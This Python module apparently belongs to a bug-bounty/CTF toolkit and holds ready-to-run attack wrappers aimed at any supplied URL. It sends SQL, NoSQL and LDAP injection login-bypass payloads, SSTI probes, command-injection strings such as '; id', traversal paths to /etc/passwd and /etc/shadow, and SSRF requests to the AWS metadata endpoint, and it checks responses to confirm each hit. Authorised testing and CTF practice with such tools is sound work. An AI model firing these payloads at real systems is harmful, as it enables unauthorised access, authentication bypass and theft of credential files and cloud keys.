"""Quick security test wrappers — one-liner functions for common vulnerability classes.

All functions accept an optional `scanner` parameter to reuse a SecurityScanner
across tests, preserving state and findings. If omitted, a fresh scanner is created.
"""

from __future__ import annotations

from typing import Any

from bugbounty_ctf.engine import ResponseDiff, SecurityScanner, derive_base_url


def _get_scanner(url: str, scanner: SecurityScanner | None = None) -> SecurityScanner:
    """Return the provided scanner or create one for the given URL's origin."""
    if scanner is not None:
        return scanner
    return SecurityScanner(derive_base_url(url))


def test_login_sqli(
    url: str,
    username_field: str = "username",
    password_field: str = "password",
    *,
    scanner: SecurityScanner | None = None,
) -> list[dict[str, Any]]:
    """Test a login form for SQL injection."""
    scanner = _get_scanner(url, scanner)
    baseline = scanner.get_baseline(
        "POST", url, data={username_field: "test", password_field: "test"}
    )

    payloads = {
        "single_quote": "'",
        "or_true": "' OR 1=1--",
        "or_true_alt": "' OR '1'='1",
        "admin_comment": "admin'--",
        "or_empty": "' OR ''='",
    }

    print(f"[*] Testing SQLi on {url}")
    print(f"[*] Baseline: status={baseline.status_code}, length={len(baseline.text)}")

    results: list[dict[str, Any]] = []
    for name, payload in payloads.items():
        test_data = {username_field: payload, password_field: "anything"}
        r = scanner._make_request("POST", url, data=test_data)

        diff = ResponseDiff(baseline, r)
        analysis = diff.analyze()

        if analysis.interesting:
            print(f"[!] INTERESTING: {name}")
            for d in analysis.differences:
                print(f"    - {d}")
            results.append({"payload": name, "interesting": True, "analysis": analysis.to_dict()})
        else:
            print(f"[-] No change: {name}")

    return results


def test_ssti(
    url: str,
    method: str = "POST",
    param_name: str = "template",
    *,
    scanner: SecurityScanner | None = None,
) -> list[dict[str, Any]]:
    """Test an endpoint for Server-Side Template Injection."""
    scanner = _get_scanner(url, scanner)

    is_post = method.upper() in ("POST", "PUT", "PATCH")
    if is_post:
        baseline = scanner.get_baseline(method, url, data={param_name: "test"})
    else:
        baseline = scanner.get_baseline(method, url, params={param_name: "test"})

    payloads = {
        "math_7x7": "{{7*7}}",
        "math_7x49": "{{7*49}}",
        "config": "{{config}}",
        "self": "{{self}}",
    }

    print(f"[*] Testing SSTI on {url}")
    print(f"[*] Baseline: status={baseline.status_code}, length={len(baseline.text)}")

    results: list[dict[str, Any]] = []
    for name, payload in payloads.items():
        if is_post:
            r = scanner._make_request(method, url, data={param_name: payload})
        else:
            r = scanner._make_request(method, url, params={param_name: payload})

        diff = ResponseDiff(baseline, r)
        analysis = diff.analyze()

        if analysis.interesting:
            print(f"[!] INTERESTING: {name}")
            for d in analysis.differences:
                print(f"    - {d}")
            # SSTI confirmation: payload substring appears, but the math result
            # is in the response AND was NOT in the baseline.
            if "7*7" in payload and "49" in r.text and "49" not in baseline.text:
                print("    [!] SSTI CONFIRMED — 7*7 evaluated to 49!")
            if "7*49" in payload and "343" in r.text and "343" not in baseline.text:
                print("    [!] SSTI CONFIRMED — 7*49 evaluated to 343!")
            results.append({"payload": name, "interesting": True, "analysis": analysis.to_dict()})
        else:
            print(f"[-] No change: {name}")

    return results


def test_command_injection(
    url: str,
    method: str = "GET",
    param_name: str = "input",
    *,
    scanner: SecurityScanner | None = None,
) -> list[dict[str, Any]]:
    """Test an endpoint for command injection."""
    scanner = _get_scanner(url, scanner)

    is_post = method.upper() in ("POST", "PUT", "PATCH")
    if is_post:
        baseline = scanner.get_baseline(method, url, data={param_name: "test"})
    else:
        baseline = scanner.get_baseline(method, url, params={param_name: "test"})

    payloads = {
        "semicolon_id": "; id",
        "pipe_id": "| id",
        "backtick_id": "`id`",
        "dollar_id": "$(id)",
        "whoami": "; whoami",
    }

    print(f"[*] Testing command injection on {url}")
    print(f"[*] Baseline: status={baseline.status_code}, length={len(baseline.text)}")

    results: list[dict[str, Any]] = []
    for name, payload in payloads.items():
        if is_post:
            r = scanner._make_request(method, url, data={param_name: payload})
        else:
            r = scanner._make_request(method, url, params={param_name: payload})

        diff = ResponseDiff(baseline, r)
        analysis = diff.analyze()

        if analysis.interesting:
            print(f"[!] INTERESTING: {name}")
            for d in analysis.differences:
                print(f"    - {d}")
            if "uid=" in r.text or "gid=" in r.text:
                print("    [!] COMMAND EXECUTION CONFIRMED!")
            results.append({"payload": name, "interesting": True, "analysis": analysis.to_dict()})
        else:
            print(f"[-] No change: {name}")

    return results


def test_path_traversal(
    url: str,
    method: str = "GET",
    param_name: str = "file",
    *,
    scanner: SecurityScanner | None = None,
) -> list[dict[str, Any]]:
    """Test an endpoint for path traversal."""
    scanner = _get_scanner(url, scanner)

    is_post = method.upper() in ("POST", "PUT", "PATCH")
    if is_post:
        baseline = scanner.get_baseline(method, url, data={param_name: "test.txt"})
    else:
        baseline = scanner.get_baseline(method, url, params={param_name: "test.txt"})

    payloads = {
        "passwd_1": "../../../etc/passwd",
        "passwd_2": "../../../../../../etc/passwd",
        "shadow": "../../../../../../etc/shadow",
        "hosts": "../../../../../../etc/hosts",
    }

    print(f"[*] Testing path traversal on {url}")
    print(f"[*] Baseline: status={baseline.status_code}, length={len(baseline.text)}")

    results: list[dict[str, Any]] = []
    for name, payload in payloads.items():
        if is_post:
            r = scanner._make_request(method, url, data={param_name: payload})
        else:
            r = scanner._make_request(method, url, params={param_name: payload})

        diff = ResponseDiff(baseline, r)
        analysis = diff.analyze()

        if analysis.interesting:
            print(f"[!] INTERESTING: {name}")
            for d in analysis.differences:
                print(f"    - {d}")
            if "root:x:0:" in r.text:
                print("    [!] PATH TRAVERSAL CONFIRMED — /etc/passwd content found!")
            results.append({"payload": name, "interesting": True, "analysis": analysis.to_dict()})
        else:
            print(f"[-] No change: {name}")

    return results


def test_nosqli(
    url: str,
    username_field: str = "username",
    password_field: str = "password",
    *,
    scanner: SecurityScanner | None = None,
) -> list[dict[str, Any]]:
    """Test a JSON login endpoint for NoSQL injection."""
    scanner = _get_scanner(url, scanner)
    baseline = scanner.get_baseline(
        "POST", url, json={username_field: "test", password_field: "test"}
    )

    payloads = {
        "ne_null_username": {username_field: {"$ne": None}, password_field: "x"},
        "ne_null_both": {username_field: {"$ne": None}, password_field: {"$ne": None}},
        "ne_empty": {username_field: {"$ne": ""}, password_field: {"$ne": ""}},
        "gt_empty": {username_field: {"$gt": ""}, password_field: {"$gt": ""}},
        "regex_all": {username_field: {"$regex": ".*"}, password_field: {"$regex": ".*"}},
    }

    print(f"[*] Testing NoSQL injection on {url}")
    print(f"[*] Baseline: status={baseline.status_code}, length={len(baseline.text)}")

    results: list[dict[str, Any]] = []
    for name, payload in payloads.items():
        r = scanner._make_request("POST", url, json=payload)

        diff = ResponseDiff(baseline, r)
        analysis = diff.analyze()

        if analysis.interesting:
            print(f"[!] INTERESTING: {name}")
            for d in analysis.differences:
                print(f"    - {d}")
            if "logged_in" in r.text or "success" in r.text.lower():
                print("    [!] AUTH BYPASS CONFIRMED!")
            results.append({"payload": name, "interesting": True, "analysis": analysis.to_dict()})
        else:
            print(f"[-] No change: {name}")

    return results


def test_ldap_injection(
    url: str,
    username_field: str = "username",
    password_field: str = "password",
    *,
    scanner: SecurityScanner | None = None,
) -> list[dict[str, Any]]:
    """Test a login endpoint for LDAP injection."""
    scanner = _get_scanner(url, scanner)
    baseline = scanner.get_baseline(
        "POST", url, data={username_field: "test", password_field: "test"}
    )

    payloads = {
        "wildcard_both": {username_field: "*", password_field: "*"},
        "wildcard_user": {username_field: "*", password_field: "x"},
        "or_true": {username_field: "*)(uid=*))(|(uid=*", password_field: "x"},
    }

    print(f"[*] Testing LDAP injection on {url}")
    print(f"[*] Baseline: status={baseline.status_code}, length={len(baseline.text)}")

    results: list[dict[str, Any]] = []
    for name, payload in payloads.items():
        r = scanner._make_request("POST", url, data=payload)

        diff = ResponseDiff(baseline, r)
        analysis = diff.analyze()

        if analysis.interesting:
            print(f"[!] INTERESTING: {name}")
            for d in analysis.differences:
                print(f"    - {d}")
            if "logged_in" in r.text or "success" in r.text.lower() or "uid" in r.text:
                print("    [!] LDAP INJECTION CONFIRMED!")
            results.append({"payload": name, "interesting": True, "analysis": analysis.to_dict()})
        else:
            print(f"[-] No change: {name}")

    return results


def test_ssrf(
    url: str,
    method: str = "POST",
    param_name: str = "url",
    *,
    scanner: SecurityScanner | None = None,
    url_suffix: str = "",
) -> list[dict[str, Any]]:
    """Test an endpoint for SSRF.

    Args:
        url: Target endpoint URL
        method: HTTP method
        param_name: Parameter name that accepts URLs
        scanner: Optional shared scanner
        url_suffix: Suffix appended to each payload URL (e.g. '#.yaml' for
                    targets that require specific file extensions)
    """
    scanner = _get_scanner(url, scanner)

    is_post = method.upper() in ("POST", "PUT", "PATCH")
    if is_post:
        baseline = scanner.get_baseline(method, url, data={param_name: "http://example.com"})
    else:
        baseline = scanner.get_baseline(method, url, params={param_name: "http://example.com"})

    payloads = {
        "localhost": "http://127.0.0.1",
        "localhost_alt": "http://localhost",
        "aws_metadata": "http://169.254.169.254/latest/meta-data/",
        "octal": "http://0177.0.0.1",
        "decimal": "http://2130706433",
        "hex": "http://0x7f000001",
        "short": "http://127.1",
        "zero": "http://0",
        "metadata_decimal": "http://2852039166/latest/meta-data/",
    }

    if url_suffix:
        payloads = {k: v + url_suffix for k, v in payloads.items()}

    print(f"[*] Testing SSRF on {url}")
    print(f"[*] Baseline: status={baseline.status_code}, length={len(baseline.text)}")

    results: list[dict[str, Any]] = []
    for name, payload in payloads.items():
        if is_post:
            r = scanner._make_request(method, url, data={param_name: payload})
        else:
            r = scanner._make_request(method, url, params={param_name: payload})

        diff = ResponseDiff(baseline, r)
        analysis = diff.analyze()

        if analysis.interesting:
            print(f"[!] INTERESTING: {name}")
            for d in analysis.differences:
                print(f"    - {d}")
            if "AccessKeyId" in r.text or "meta-data" in r.text:
                print("    [!] SSRF CONFIRMED — Internal service accessed!")
            results.append({"payload": name, "interesting": True, "analysis": analysis.to_dict()})
        else:
            print(f"[-] No change: {name}")

    return results


def map_surface(base_url: str, *, scanner: SecurityScanner | None = None) -> dict[str, Any]:
    """Map the attack surface of a target."""
    scanner = _get_scanner(base_url, scanner)
    surface = scanner.map_surface("/")

    print(f"[*] Attack Surface Map for {base_url}")
    print(f"[*] Status: {surface.get('status_code')}")
    print(f"[*] Technology: {', '.join(surface.get('tech_hints', []))}")
    print(f"\n[*] Forms found: {len(surface.get('forms', []))}")
    for i, form in enumerate(surface.get("forms", [])):
        print(f"  Form {i + 1}: {form['method']} {form['action']}")
        for inp in form["inputs"]:
            print(f"    - {inp['name']} (value: {inp['value']})")

    print(f"\n[*] Links found: {len(surface.get('links', []))}")
    for link in surface.get("links", [])[:20]:
        print(f"  - {link}")
    if len(surface.get("links", [])) > 20:
        print(f"  ... and {len(surface['links']) - 20} more")

    return surface
